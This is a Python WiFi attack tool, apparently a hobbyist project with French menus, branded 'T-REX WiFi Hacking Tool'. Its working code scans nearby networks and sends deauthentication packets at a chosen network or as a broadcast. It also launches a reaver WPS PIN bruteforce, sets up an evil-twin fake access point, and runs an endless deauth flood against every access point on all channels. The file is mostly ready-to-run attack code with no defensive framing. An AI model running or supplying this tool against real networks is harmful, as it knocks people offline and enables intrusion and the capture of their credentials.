import pyfiglet
import colorama
from colorama import Fore, init, Style, Back
import os
import time
import subprocess
from scapy.all import *
from threading import Thread

def check_tool(tool_name):
    global tools_missing
    try:
        subprocess.run([tool_name, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Fore.GREEN}Vérification de l'outil {tool_name}.... installé!")
    except FileNotFoundError:
        print(f"{Fore.RED}Vérification de l'outil {tool_name}.... non installé!")
        tools_missing.append(tool_name)

tools = ['reaver', 'aircrack-ng', 'wireshark','tcpdump']
tools_missing = []

def clear_console():
    os.system("clear" if os.name == "posix" else "cls")

def ascii_animation():
    arts = [
        pyfiglet.figlet_format("T-REX", font="slant"),
        pyfiglet.figlet_format("WiFi Hacking Tool", font="standard"),
        pyfiglet.figlet_format("By @mnesia-Code", font="slant")
    ]
    colors = [Fore.RED, Fore.CYAN, Fore.GREEN, Fore.YELLOW, Fore.MAGENTA]

    clear_console()
    for art in arts:
        for line in art.splitlines():
            print(colors[arts.index(art) % len(colors)] + line)
            time.sleep(0.05)
        time.sleep(1)
        clear_console()

    print(Fore.YELLOW + Style.BRIGHT + "Vérification des logiciels nécéssaires...\n")
    time.sleep(1)

def list_interfaces():
    clear_console()
    print(Fore.CYAN + "Recherche des interfaces réseau disponibles...")
    result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, text=True).stdout
    interfaces = [line.split()[0] for line in result.splitlines() if "IEEE" in line]
    if not interfaces:
        print(Fore.RED + "Aucune interface WiFi détectée.")
        exit()
    print(Fore.YELLOW + "Interfaces disponibles :")
    for i, iface in enumerate(interfaces, 1):
        print(Fore.GREEN + f"{i} => {iface}")
    choice = int(input(Fore.CYAN + "Choisis une interface : ")) - 1
    return interfaces[choice]

def check_monitor_mode(interface):
    return interface + "mon" if "mon" not in interface else interface.replace("mon", "")

def put_interface_in_monitor_mode(interface):
    monitor_interface = check_monitor_mode(interface)
    print(Fore.GREEN + Style.BRIGHT + f"Passage de {interface} en mode moniteur...")
    subprocess.run(["airmon-ng", "start", interface], check=False)
    return monitor_interface

def put_interface_in_normal_mode(interface):
    normal_interface = check_monitor_mode(interface)
    print(Fore.GREEN + Style.BRIGHT + f"Passage de {interface} en mode normal...")
    subprocess.run(["airmon-ng", "stop", normal_interface], check=False)
    return normal_interface

def scan_networks(interface):
    clear_console()
    print(Fore.CYAN + Style.BRIGHT + f"Scan des réseaux WiFi sur {interface}...")
    networks = {}
    channels = range(1, 14)

    def change_channel(channel):
        subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def packet_handler(pkt):
        try:
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info else "Hidden"
                channel = int(ord(pkt[Dot11Elt:3].info))
                if bssid not in networks:
                    networks[bssid] = {"SSID": ssid, "Channel": channel}
                    print(Fore.YELLOW + f"[{len(networks)}] SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")
        except Exception as e:
            print(Fore.RED + f"Erreur lors du traitement d'un paquet : {e}")

    for channel in channels:
        change_channel(channel)
        print(Fore.GREEN + f" >>>Passage au canal  {channel}...")
        sniff(iface=interface, prn=packet_handler, timeout=2)

    if not networks:
        print(Fore.RED + Style.BRIGHT + "Aucun réseau détecté.")
        return None

    print(Fore.GREEN + Style.BRIGHT + "Sélectionne un réseau :")
    for i, (bssid, data) in enumerate(networks.items(), 1):
        print(Fore.CYAN + f"{i} => {data['SSID']} (BSSID: {bssid}, Channel: {data['Channel']})")

    try:
        choice = int(input(Fore.CYAN + "Entrez le numéro du réseau : ")) - 1
        selected_bssid = list(networks.keys())[choice]
        print(Fore.YELLOW + f"Info sur le réseau:\nSSID: {networks[selected_bssid]['SSID']}\nBSSID: {selected_bssid}\nChannel: {networks[selected_bssid]['Channel']}")
        return networks[selected_bssid]["SSID"], selected_bssid, networks[selected_bssid]["Channel"]
    except (ValueError, IndexError):
        print(Fore.RED + "Choix invalide.")
        return None

def sniff_all_networks(interface):
    clear_console()
    print(Fore.CYAN + Style.BRIGHT + f"Sniffing des réseaux sur {interface}...")

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info else "Hidden"
            print(Fore.YELLOW + f"SSID: {ssid}, BSSID: {bssid}")

    print(Fore.GREEN + "Appuyez sur Ctrl+C pour arrêter le sniffing...")
    try:
        sniff(iface=interface, prn=packet_handler)
    except KeyboardInterrupt:
        print(Fore.RED + "\nArrêt du sniffing.")

def sniff_single_network(interface, bssid):
    clear_console()
    print(Fore.CYAN + Style.BRIGHT + f"Sniffing du réseau {bssid} sur {interface}...")

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            print(Fore.YELLOW + f"Paquet reçu de {pkt[Dot11].addr2}")

    print(Fore.GREEN + "Appuyez sur Ctrl+C pour arrêter le sniffing...")
    try:
        sniff(iface=interface, prn=packet_handler)
    except KeyboardInterrupt:
        print(Fore.RED + "\nArrêt du sniffing.")

def deauth_attack(interface):
    network = scan_networks(interface)
    if not network:
        print(Fore.RED + "Aucun réseau sélectionné.")
        return

    ssid, bssid, channel = network
    print(Fore.RED + f"Lancement de l'attaque de déauthentification sur {ssid} (BSSID: {bssid})...")
    target = input(Fore.CYAN + "Entrez l'adresse MAC de la cible (ou laissez vide pour toutes les cibles) : ")
    if not target:
        target = "ff:ff:ff:ff:ff:ff"

    def deauth_pkt():
        pkt = RadioTap() / Dot11(
            addr1=target,
            addr2=bssid,
            addr3=bssid
        ) / Dot11Deauth(reason=7)
        return pkt

    try:
        for i in range(100):
            sendp(deauth_pkt(), iface=interface, count=10, inter=0.1, verbose=False)
            print(Fore.GREEN + f">>>Sending packets... >>> {i * 10}")
    except KeyboardInterrupt:
        print(Fore.RED + "\nAttaque stoppée.")

def wps_bruteforce(interface):
    network = scan_networks(interface)
    if not network:
        print(Fore.RED + "Aucun réseau sélectionné.")
        return

    ssid, bssid, channel = network
    print(Fore.RED + Style.BRIGHT + f"Lancement d'une attaque bruteforce WPS (avec reaver) sur {ssid} (BSSID: {bssid})...")
    try:
        subprocess.run(["reaver", "-i", interface, "-b", bssid, "-c", str(channel), "-vv"], check=False)
    except KeyboardInterrupt:
        print(Fore.RED + "Bruteforce WPS annulé.")

def evil_twin_menu(interface):
    clear_console()
    print(Fore.YELLOW + "Evil Twin Attack Menu")
    print(Fore.GREEN + "1. Configurer un faux point d'accès")
    print(Fore.GREEN + "99. Retour au menu principal")

    choice = input(Fore.CYAN + "Choisis une option : ")
    if choice == "1":
        name = input("Entrez le nom du faux wifi :  ")
        if name == "":
            print("Aucun nom entré. Le wifi s'appellera 'Free wifi'")
            name = "Free wifi"
        print(Fore.RED + "Création du evil twin =>", name)
        subprocess.run(["airbase-ng", "-e", name, interface], check=False)
    elif choice == "99":
        return
    else:
        print(Fore.RED + "Option invalide.")


def deauth_flood_all(interface): #ct dur a faire : mais enft je voulais absolument faire une loop qui deauth sur tt les chaine ducoup perfect
    print(Fore.RED + "Lancement de l'attaque Deauth Flood sur tous les réseaux WiFi détectés...")
    networks = {}
    channels = range(1, 14)

    def change_channel(channel):
        subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def packet_handler(pkt): #ça sent le copy + paste par ici.. non ?
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            if bssid not in networks:
                networks[bssid] = True
                print(Fore.YELLOW + f"AP détecté : BSSID {bssid}")


    for channel in channels:
        change_channel(channel)
        sniff(iface=interface, prn=packet_handler, timeout=1)

    if not networks:
        print(Fore.RED + "Aucun réseau détecté pour l'attaque.")
        return


    try:
        while True:
            for bssid in networks.keys():
                pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
                sendp(pkt, iface=interface, count=200, inter=0.1, verbose=False)
                print(Fore.GREEN + Back.BLACK + Style.BRIGHT + f">>> Envoi 200 de paquets deauth au BSSID {bssid}")
    except KeyboardInterrupt:
        print(Fore.RED + "\nDeauth Flood stoppé.")

def main_menu(interface):
    while True:
        clear_console()
        choice = input(
            Fore.BLUE +
            "   Menu Principal !\n"
            "   >>> 0 => Mettre l'interface en mode moniteur\n"
            "   >>> 00 => Mettre l'interface en mode normal\n"
            "   >>> 1 => Scanner les WiFi\n"
            "   >>> 2 => Tenter un bruteforce WPS (=> Avec reaver)\n"
            "   >>> 3 => Menu Evil Twin\n"
            "   >>> 4 => Attaque deauth\n"
            "   >>> 5 => Sniffing de tous les réseaux (=>Avec Scapy)\n"
            "   >>> 6 => Sniffing d'un seul réseau (=> Avec Scapy\n"
            "   >>> 7 => Sniffing avancé (Tcpdump / Wireshark / Airodump-ng)\n"
            "   >>> 8 => Deauth flood (=> Envoie de paquets deauth a tout les wifi, sur tout les canaux)\n"
            "   >>> 99 => Quitter\n"+
            Fore.GREEN + Style.BRIGHT + Back.BLACK + "[CHOIX]>>> "
        )

        if choice == "0":
            interface = put_interface_in_monitor_mode(interface)
        elif choice == "00":
            interface = put_interface_in_normal_mode(interface)
        elif choice == "1":
            scan_network = scan_networks(interface)
        elif choice == "2":
            wps_bruteforce(interface)
        elif choice == "3":
            evil_twin_menu(interface)
        elif choice == "4":
            deauth_attack(interface)
        elif choice == "5":
            sniff_all_networks(interface)
        elif choice == "6":
            ssid, bssid, channel = scan_networks(interface)
            if bssid:
                sniff_single_network(interface, bssid)
        elif choice == "7":
                print(Fore.GREEN + Style.BRIGHT + "Chargements du menu Sniffing [+]...")
                time.sleep(1)
                os.system("clear")
                menu2 = input(Fore.BLUE + Style.BRIGHT + "Choissisez l'outils pour le sniffing  :\n1 => Wireshark\n2 => Tcpdump\n3 => Airodump-ng\n\n[choix]>>> ")
                if menu2 == "1":
                  print(Fore.RED + "Starting...")
                  time.sleep(1)
                  subprocess.run(["wireshark","-i",interface])
                elif menu2 == "2":
                  print(Fore.RED + "Starting...")
                  time.sleep(1)
                  subprocess.run(["tcpdump","-i",interface])
                elif menu2 == "3":
                  print(Fore.RED + "Starting...")
                  time.sleep(1)
                  subprocess.run(["airodump-ng",interface])
        elif choice == "8":
            os.system("clear")
            print(Fore.RED + Back.BLACK + "Starting...")
            time.sleep(1)
            deauth_flood_all(interface)
        elif choice == "99":
            print(Fore.GREEN + "Salut !")
            break
        else:
            print(Fore.RED + Style.BRIGHT + "Choix invalide. Recommence.")

def main():
    init(autoreset=True)
    ascii_animation()
    print("Vérification des outils nécessaires...")
    for tool in tools:
        check_tool(tool)
        time.sleep(0.5)

    if tools_missing:
        print(Fore.YELLOW + "Il manque ces outils :")
        for missing in tools_missing:
            print(Fore.RED + f"- {missing}")
        time.sleep(5)
        exit()

    interface = list_interfaces()
    main_menu(interface)

if __name__ == "__main__":
    main()
